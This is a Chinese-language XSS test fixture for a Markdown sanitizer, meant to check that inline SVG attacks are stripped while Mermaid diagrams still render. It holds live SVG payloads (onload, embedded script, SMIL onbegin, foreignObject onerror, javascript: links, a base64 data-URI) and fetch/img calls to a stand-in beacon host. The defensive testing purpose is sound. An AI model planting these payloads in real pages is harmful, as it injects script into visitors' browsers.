# XSS 样本 03：SVG 内嵌脚本与 onload

**攻击手法**：SVG 是"会执行脚本的图片"。内联 SVG 既可以带 `onload` 事件属性，也可以在 `<svg>` 内部直接嵌 `<script>`，还能通过 `<animate>`/`<set>` 的 SMIL 事件（`onbegin`/`onend`）和 `<foreignObject>` 引入 HTML 上下文绕过只针对 HTML 标签的过滤器。

**预期：脚本不执行、无外网请求。**

**验证方法**：打开本文件 → 无弹窗 → Console 无 `XSS-03` 输出 → Network 零外部请求 → Elements 面板中内联 SVG 应被整体剥离或仅保留无事件属性的安全子集（DOMPurify 配置中 `svg: false` 时应被整体移除）。

---

## payload 1：svg onload

<svg onload="alert('XSS-03-A')" width="100" height="100"><circle cx="50" cy="50" r="40" /></svg>

## payload 2：svg 内嵌 script

<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert('XSS-03-B')</script>
  <rect width="100" height="100" fill="#888" />
</svg>

## payload 3：SMIL animate onbegin

<svg width="100" height="100">
  <animate onbegin="alert('XSS-03-C')" attributeName="x" dur="1s" />
</svg>

<svg width="100" height="100">
  <set attributeName="x" onbegin="fetch('https://xss-beacon.example.invalid/03-d')" />
</svg>

## payload 4：foreignObject 引入 HTML 上下文

<svg width="200" height="100">
  <foreignObject width="200" height="100">
    <div xmlns="http://www.w3.org/1999/xhtml" onmouseover="alert('XSS-03-E')">悬停这里</div>
    <img xmlns="http://www.w3.org/1999/xhtml" src=x onerror="alert('XSS-03-F')" />
  </foreignObject>
</svg>

## payload 5：svg 内的 a 标签 + javascript 协议

<svg width="100" height="100">
  <a xlink:href="javascript:alert('XSS-03-G')"><text x="10" y="20">点我</text></a>
</svg>

## payload 6：use 引用远程/数据 URI 的 SVG

<svg width="100" height="100">
  <use href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPjwvc3ZnPg==" />
</svg>

<svg width="100" height="100">
  <use href="https://xss-beacon.example.invalid/03-h.svg#icon" />
</svg>

## payload 7：外部 SVG 当作图片引入（浏览器中不执行脚本，但会产生外网请求）

<img src="https://xss-beacon.example.invalid/03-i.svg" alt="外部 SVG">

![外部 SVG（Markdown 语法）](https://xss-beacon.example.invalid/03-j.svg)

## payload 8：SVG 作为 CSS 背景

<div style="width:100px;height:100px;background-image:url('https://xss-beacon.example.invalid/03-k.svg')">背景 SVG</div>

---

## 对照组（Mermaid 生成的 SVG 必须正常显示）

```mermaid
flowchart LR
    A[Mermaid 生成的 SVG] --> B[应当正常渲染]
```

> **判定口径**：所有 payload 不执行、无外网请求；同时 Mermaid 图仍正常渲染——消毒策略不能因为"SVG 危险"就把 Mermaid 一起干掉。
> 这条对照非常关键：Mermaid 的输出是**渲染后**插入的 SVG，与文档内联 SVG 走的是不同路径，消毒配置必须分别处理。
